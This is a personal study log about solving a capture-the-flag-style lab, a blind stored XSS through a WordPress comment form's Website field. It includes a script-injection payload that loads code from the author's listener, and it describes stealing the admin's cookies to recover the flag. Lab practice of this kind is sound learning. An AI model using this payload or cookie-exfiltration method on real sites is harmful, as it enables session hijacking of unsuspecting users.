---
layout: log
title: "Day 34 - Blind XSS and Session Hijacking" 
date: 2026-04-21
topics: ["Blind XSS", "Stored XSS", "Session Hijacking", "WordPress Comments"]
summary: "Worked through a blind XSS assessment, identified the vulnerable Website field, confirmed execution with an external script callback, and used it to exfiltrate the flag from an admin-side context."
status: complete
---

# Day 34 – Blind XSS and Session Hijacking

## What I studied today

Today I focused mainly on a blind XSS assessment in an HTB-style lab.

- Looked at the HTML source of a WordPress comment page
- Noticed the comment approval hint and connected it to blind XSS
- Tested different XSS payload shapes against likely form fields
- Confirmed the vulnerable field using an external script callback
- Used the working payload to exfiltrate cookies and recover the flag

---

## Summary of concepts

The main thing I learned today is that blind XSS is different from normal reflected or stored XSS because I do not get to see the vulnerable sink myself.

- If user input is only rendered in an admin panel or moderation queue, I may never see the execution directly
- A request to my own server is enough to prove code execution, even if the response is a 404
- Blind XSS testing is often about identifying both the vulnerable field and the correct payload shape
- Loading a remote script with `<script src=...>` is a very useful way to detect execution and later switch to exploitation
- Once JavaScript runs in the victim's browser, it may be able to access `document.cookie` and send it back to me unless the important cookie is protected with `HttpOnly`

---

## Deeper understanding (optional but recommended)

What made this click for me today was understanding the difference between **input point** and **execution point**.

I typed the payload into the public comment form, but the payload did not execute there. Instead, it was likely stored and later rendered somewhere the admin could see it. That means I had to think less like “where do I see my payload?” and more like “where will someone else eventually render this data?”

The important flow looked like this:

1. I submit crafted input into a form field
2. The application stores or forwards that input
3. An admin reviews it in another page or panel
4. Their browser interprets my input unsafely
5. My script runs in their browser context
6. Their browser reaches back to my server, proving execution

That made the hint *“you can’t see me but I can see you”* make perfect sense.

---

## What I actually did (important)

This is the part I actually worked through, not just read about.

- Inspected the HTML source of the page and noticed the WordPress comment form with `comment`, `author`, `email`, and `url` fields
- Spotted the note that comments must be approved by an admin, which strongly suggested a blind XSS path
- Set up a local PHP server on my VPN IP and used port `8080` because port `80` was already taken
- Tested a payload in the Website field:
  ```html
  "><script src="http://10.10.14.77:8080/website"></script>
```

* Observed a callback to my listener:

  ```text
  GET /website
  ```
* Concluded that the **Website** field was the vulnerable blind XSS entry point
* Replaced the detection file with JavaScript that sent `document.cookie` back to my server
* Logged the callback and recovered the flag from the exfiltrated cookie data

---

## What went well

* I recognized the blind XSS hint pretty quickly once I saw the admin approval message
* I did not get stuck on trying to make an alert box pop up locally
* Using a callback server made the testing process much clearer
* I correctly interpreted the 404 as proof of execution instead of assuming the attempt failed
* Once I got the first callback, switching from detection to exploitation felt straightforward

---

## What was confusing

Be honest. This is where learning happens.

* At first I was not fully sure whether I had found a real XSS sink or just a suspicious input field
* I hesitated a bit on whether this was stored XSS or blind XSS, when really it was blind stored XSS
* It took me a minute to remember that the response code does not matter as much as the request itself during detection
* I had to think carefully about why the Website field would be rendered in a way that allowed the payload to break out and execute

---

## Mistakes / friction

What slowed me down or caused issues?

* I initially treated the page more like a normal visible XSS target instead of assuming admin-side rendering
* Port `80` was already in use, so I had to switch to `8080`
* I needed to test payload shape and field choice instead of assuming the first obvious field would work
* I almost overfocused on the comment body, while the Website field ended up being the actual sink

---

## What I think I understand now

Try to summarize your current understanding.

This is important:
don’t aim for perfection, aim for clarity

* Blind XSS means my payload executes in a context I do not control or directly see
* A successful callback to my server is enough to confirm execution
* The goal is often to identify both the vulnerable field and the correct breakout/injection context
* Once the victim browser loads my external script, I can change that script from a harmless detector into an exfiltration payload
* Session hijacking through XSS depends on whether the browser exposes useful cookies to JavaScript

---

## What I need to improve

Be specific.

* Practice identifying likely admin-side rendering paths more quickly
* Get faster at choosing payloads based on likely HTML or attribute context
* Build a small reusable blind XSS testing workflow so I do not have to improvise each time
* Strengthen my understanding of when cookies are blocked by `HttpOnly` and how that changes post-exploitation options
* Practice writing cleaner notes while solving labs so documentation is easier afterward

---

## Plan for next session

Keep this small and realistic.

* Review blind XSS payload variations and when each one makes sense
* Practice another XSS lab with less guidance
* Revisit session hijacking and cookie behavior in the browser dev tools
* Add a short writeup of this lab to my notes or GitHub study log

---

## Session info (optional)

* Duration: 4h 
* Energy: Medium
